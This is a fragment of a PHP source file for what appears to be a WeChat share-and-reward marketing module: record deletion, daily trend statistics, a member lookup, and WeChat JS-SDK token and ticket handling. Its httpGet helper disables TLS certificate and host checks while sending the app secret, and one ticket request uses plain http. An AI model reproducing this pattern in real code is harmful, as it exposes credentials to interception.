            $id = intval($id);
            if ($id == 0)
                continue;
            //删除使用记录
			$doings = pdo_fetch("select * FROM " . tablename('stonefish_redfunshare_mobileverify') . " where id = :id", array(':id' => $id));
			if(empty($doings)){
				continue;
			}
			//删除赠送记录
			pdo_delete('stonefish_redfunshare_mobileverify', array('id' => $id));
			//删除赠送记录
        }
		echo json_encode(array('errno' => 0,'error' => '手机验证记录删除成功！'));
		exit;
    }
	//删除手机验证记录
	//活动分析表
	public function doWebTrend() {
        global $_GPC, $_W;
		load()->func('tpl');
        $rid = intval($_GPC['rid']);
		$rid = empty($rid) ? intval($_GPC['id']) : $rid;
		$reply = pdo_fetch("select * FROM " . tablename('stonefish_redfunshare_reply') . " where rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		$reply['zhongjiangnum'] =  pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stonefish_redfunshare_fansaward') . ' WHERE rid = :rid AND uniacid = :uniacid and zhongjiang>=1', array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
		$reply['lingqunum'] = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stonefish_redfunshare_fansaward') . ' WHERE rid = :rid AND uniacid = :uniacid and zhongjiang=2', array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
		$reply['helpnum'] = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stonefish_redfunshare_sharedata') . ' WHERE rid = :rid AND uniacid = :uniacid AND share_type=1', array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
		//今日昨天关键指标
		$fansnum = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stonefish_redfunshare_fans') . ' WHERE rid = :rid AND uniacid = :uniacid AND createtime >= :starttime AND createtime <= :endtime', array(':rid' => $rid, ':uniacid' => $_W['uniacid'], ':starttime' => strtotime(date('Y-m-d')) - 86400, ':endtime' => strtotime(date('Y-m-d'))));
		$help_num = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stonefish_redfunshare_fansaward') . ' WHERE rid = :rid AND uniacid = :uniacid AND consumetime >= :starttime AND consumetime <= :endtime and zhongjiang=2', array(':rid' => $rid, ':uniacid' => $_W['uniacid'], ':starttime' => strtotime(date('Y-m-d')) - 86400, ':endtime' => strtotime(date('Y-m-d'))));
		$helpnum = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stonefish_redfunshare_sharedata') . ' WHERE rid = :rid AND uniacid = :uniacid AND visitorstime >= :starttime AND visitorstime <= :endtime and share_type=1', array(':rid' => $rid, ':uniacid' => $_W['uniacid'], ':starttime' => strtotime(date('Y-m-d')) - 86400, ':endtime' => strtotime(date('Y-m-d'))));
		$zhongjiangnum = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stonefish_redfunshare_fansaward') . ' WHERE rid = :rid AND uniacid = :uniacid AND createtime >= :starttime AND createtime <= :endtime and zhongjiang>=1', array(':rid' => $rid, ':uniacid' => $_W['uniacid'], ':starttime' => strtotime(date('Y-m-d')) - 86400, ':endtime' => strtotime(date('Y-m-d'))));
		
		$today_fansnum = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stonefish_redfunshare_fans') . ' WHERE rid = :rid AND uniacid = :uniacid AND createtime >= :starttime AND createtime <= :endtime', array(':rid' => $rid, ':uniacid' => $_W['uniacid'], ':starttime' => strtotime(date('Y-m-d')), ':endtime' => TIMESTAMP));
		$today_help_num = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stonefish_redfunshare_fansaward') . ' WHERE rid = :rid AND uniacid = :uniacid AND consumetime >= :starttime AND consumetime <= :endtime and zhongjiang=2', array(':rid' => $rid, ':uniacid' => $_W['uniacid'], ':starttime' => strtotime(date('Y-m-d')), ':endtime' => TIMESTAMP));
		$today_helpnum = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stonefish_redfunshare_sharedata') . ' WHERE rid = :rid AND uniacid = :uniacid AND visitorstime >= :starttime AND visitorstime <= :endtime and share_type=1', array(':rid' => $rid, ':uniacid' => $_W['uniacid'], ':starttime' => strtotime(date('Y-m-d')), ':endtime' => TIMESTAMP));
		$today_zhongjiangnum = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stonefish_redfunshare_fansaward') . ' WHERE rid = :rid AND uniacid = :uniacid AND createtime >= :starttime AND createtime <= :endtime and zhongjiang>=1', array(':rid' => $rid, ':uniacid' => $_W['uniacid'], ':starttime' => strtotime(date('Y-m-d')), ':endtime' => TIMESTAMP));
		//今日昨天关键指标
		$scroll = intval($_GPC['scroll']);
		$st = $_GPC['datelimit']['start'] ? strtotime($_GPC['datelimit']['start']) : strtotime('-30day');
	    $et = $_GPC['datelimit']['end'] ? strtotime($_GPC['datelimit']['end']) : strtotime(date('Y-m-d'));
		if(empty($_GPC['datelimit']['start']) && $st!=$reply['starttime']){
			$st=$reply['starttime'];
		}
	    $starttime = min($st, $et);
	    $endtime = max($st, $et);
		$day_num = ($endtime - $starttime) / 86400 + 1;
	    $endtime += 86399;
		if($_W['isajax'] && $_W['ispost']) {
		    $days = array();
		    $datasets = array();
		    for($i = 0; $i < $day_num; $i++){
			    $key = date('m-d', $starttime + 86400 * $i);
			    $days[$key] = 0;
			    $datasets['flow1'][$key] = 0;
				$datasets['flow2'][$key] = 0;
			    $datasets['flow3'][$key] = 0;
			    $datasets['flow4'][$key] = 0;
		    }

			$data = pdo_fetchall('SELECT createtime FROM ' . tablename('stonefish_redfunshare_fans') . ' WHERE uniacid = :uniacid AND rid = :rid AND createtime >= :starttime AND createtime <= :endtime', array(':uniacid' => $_W['uniacid'], ':rid' => $rid, ':starttime' => $starttime, ':endtime' => $endtime));
		    foreach($data as $da) {
			    $key = date('m-d', $da['createtime']);
			    if(in_array($key, array_keys($days))) {
				    $datasets['flow1'][$key]++;
			    }
		    }
			
			$data = pdo_fetchall('SELECT consumetime  FROM ' . tablename('stonefish_redfunshare_fansaward') . ' WHERE uniacid = :uniacid AND rid = :rid AND  consumetime>= :starttime AND consumetime <= :endtime and zhongjiang=2', array(':uniacid' => $_W['uniacid'], ':rid' => $rid, ':starttime' => $starttime, ':endtime' => $endtime));
		    foreach($data as $da) {
			    $key = date('m-d', $da['consumetime']);
			    if(in_array($key, array_keys($days))) {
				    $datasets['flow2'][$key]++;
			    }
		    }
			
			$data = pdo_fetchall('SELECT visitorstime FROM ' . tablename('stonefish_redfunshare_sharedata') . ' WHERE uniacid = :uniacid AND rid = :rid AND visitorstime >= :starttime AND visitorstime <= :endtime and share_type=1', array(':uniacid' => $_W['uniacid'], ':rid' => $rid, ':starttime' => $starttime, ':endtime' => $endtime));
		    foreach($data as $da) {
			    $key = date('m-d', $da['visitorstime']);
			    if(in_array($key, array_keys($days))) {
				    $datasets['flow3'][$key]++;
			    }
		    }
			
			$data = pdo_fetchall('SELECT createtime FROM ' . tablename('stonefish_redfunshare_fansaward') . ' WHERE uniacid = :uniacid AND rid = :rid AND createtime >= :starttime AND createtime <= :endtime and zhongjiang>=1', array(':uniacid' => $_W['uniacid'], ':rid' => $rid, ':starttime' => $starttime, ':endtime' => $endtime));
		    foreach($data as $da) {
			    $key = date('m-d', $da['createtime']);
			    if(in_array($key, array_keys($days))) {
				    $datasets['flow4'][$key]++;
			    }
		    }

		    $shuju['label'] = array_keys($days);
		    $shuju['datasets'] = $datasets;
		
		    if ($day_num == 1) {
			    $day_num = 2;
			    $shuju['label'][] = $shuju['label'][0];
			
			    foreach ($shuju['datasets']['flow1'] as $ky => $va) {
				    $k = $ky;
				    $v = $va;
			    }
			    $shuju['datasets']['flow1']['-'] = $v;
			
			    foreach ($shuju['datasets']['flow2'] as $ky => $va) {
				    $k = $ky;
				    $v = $va;
			    }
			    $shuju['datasets']['flow2']['-'] = $v;
			
			    foreach ($shuju['datasets']['flow3'] as $ky => $va) {
				    $k = $ky;
				    $v = $va;
			    }
			    $shuju['datasets']['flow3']['-'] = $v;
			
			    foreach ($shuju['datasets']['flow4'] as $ky => $va) {
				    $k = $ky;
				    $v = $va;
			    }
			    $shuju['datasets']['flow4']['-'] = $v;
		    }

		    $shuju['datasets']['flow1'] = array_values($shuju['datasets']['flow1']);
		    $shuju['datasets']['flow2'] = array_values($shuju['datasets']['flow2']);
		    $shuju['datasets']['flow3'] = array_values($shuju['datasets']['flow3']);
		    $shuju['datasets']['flow4'] = array_values($shuju['datasets']['flow4']);
		    exit(json_encode($shuju));		
	    }
		
        include $this->template('trend');
    }
	//活动分析表
	//选择客服UID
	public function doWebQuery(){
        global $_W, $_GPC;
        $kwd = $_GPC['keyword'];
        $params = array();
        $params[':uniacid'] = $_W['uniacid'];
        if (!empty($kwd)) {
            $sql = "SELECT a.uid, a.realname, a.nickname, b.openid FROM ".tablename('mc_mapping_fans')." as b  left join ".tablename('mc_members')." as a on a.uid = b.uid WHERE b.uniacid=:uniacid AND (a.realname LIKE :realname Or a.nickname LIKE :nickname) ORDER BY b.uid DESC LIMIT 10";
            $params[':realname'] = "%{$kwd}%";
			$params[':nickname'] = "%{$kwd}%";
        } else {
            $sql = "SELECT a.uid, a.realname, a.nickname, b.openid FROM ".tablename('mc_mapping_fans')." as b  left join ".tablename('mc_members')." as a on a.uid = b.uid  WHERE b.uniacid=:uniacid ORDER BY b.uid DESC LIMIT 10";
        }
        $ds = pdo_fetchall($sql, $params);
        foreach ($ds as $k => $row) {
            $r = array();
            $r['realname'] = $row['realname'];
            $r['nickname'] = $row['nickname'];            
            $r['uid'] = $row['uid'];
			$r['openid'] = $row['openid'];
            $ds[$k]['entry'] = $r;
        }
        include $this->template('query');
    }
	//选择客服UID
	//导出数据
	public function doWebDownload() {
        require_once 'download.php';
    }
	//导出数据
	//借用ＪＳ分享
	function getSignPackage($appId,$appSecret) {
		global $_W;
        $jsapiTicket = $this->getJsApiTicket($_W['uniacid'],$appId,$appSecret);
        $url = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        $timestamp = time();
        $nonceStr = $this->createNonceStr();
        // 这里参数的顺序要按照 key 值 ASCII 码升序排序
        $string1 = "jsapi_ticket=$jsapiTicket&noncestr=$nonceStr&timestamp=$timestamp&url=$url";
        $signature = sha1($string1);
		$signPackage = array(
			"appId"		=> $appId,
			"nonceStr"	=> $nonceStr,
			"timestamp" => "$timestamp",
			"signature" => $signature,
		);
		
		if(DEVELOPMENT) {
			$signPackage['url'] = $url;
			$signPackage['string1'] = $string1;
			$signPackage['name'] = $_W['account']['name'];
		}        
        return $signPackage;
    }

    function createNonceStr($length = 16) {
        $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        $str = "";
        for ($i = 0; $i < $length; $i++) {
            $str .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
        }
        return $str;
    }

    function getJsApiTicket($uniacid,$appId,$appSecret) {
        load()->func('cache');
        $api = cache_load("stonefish_redfunshare.api_share.json::".$uniacid, true);
        $new = false;
        if(empty($api['appid']) || $api['appid']!==$appId){
            $new = true;
        }
        if(empty($api['appsecret']) || $api['appsecret']!==$appSecret){
            $new = true;
        }      
        $data = cache_load("stonefish_redfunshare.jsapi_ticket.json::".$uniacid, true);
        if (empty($data['expire_time']) || $data['expire_time'] < time() || $new) {
            $accessToken = $this->getAccessToken($uniacid,$appId,$appSecret);       
            $url = "http://api.weixin.qq.com/cgi-bin/ticket/getticket?type=1&access_token=$accessToken";
            $res = json_decode($this->httpGet($url));
            $ticket = $res->ticket;
            if ($ticket) {
                $data['expire_time'] = time() + 7000;
                $data['jsapi_ticket'] = $ticket;
                cache_write("stonefish_redfunshare.jsapi_ticket.json::".$uniacid, iserializer($data));
                cache_write("stonefish_redfunshare.api_share.json::".$uniacid, iserializer(array("appid"=>$appId,"appsecret"=>$appSecret)));
            }
        } else {
            $ticket = $data['jsapi_ticket'];
        }
        return $ticket;
    }

    function getAccessToken($uniacid,$appId,$appSecret) {
        load()->func('cache');
        $api = cache_load("stonefish_redfunshare.api_share.json::".$uniacid, true);
        $new = false;
        if(empty($api['appid']) || $api['appid']!==$appId){
            $new = true;
        }
        if(empty($api['appsecret']) || $api['appsecret']!==$appSecret){
            $new = true;
        }
        $data = cache_load("stonefish_redfunshare.access_token.json::".$uniacid, true);     
        if (empty($data['expire_time']) || $data['expire_time'] < time() || $new) {
            $url = "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=$appId&secret=$appSecret";
            $res = json_decode($this->httpGet($url));
            $access_token = $res->access_token;
            if ($access_token) {
                $data['expire_time'] = time() + 7000;
                $data['access_token'] = $access_token;
                cache_write("stonefish_redfunshare.access_token.json::".$uniacid, iserializer($data));
                cache_write("stonefish_redfunshare.api_share.json::".$uniacid, iserializer(array("appid"=>$appId,"appsecret"=>$appSecret)));
            }
        } else {
            $access_token = $data['access_token'];
        }
        return $access_token;
    }
	function httpGet($url) {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_TIMEOUT, 500);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_URL, $url);

        $res = curl_exec($curl);
        curl_close($curl);

        return $res;
    }
	//借用ＪＳ分享
}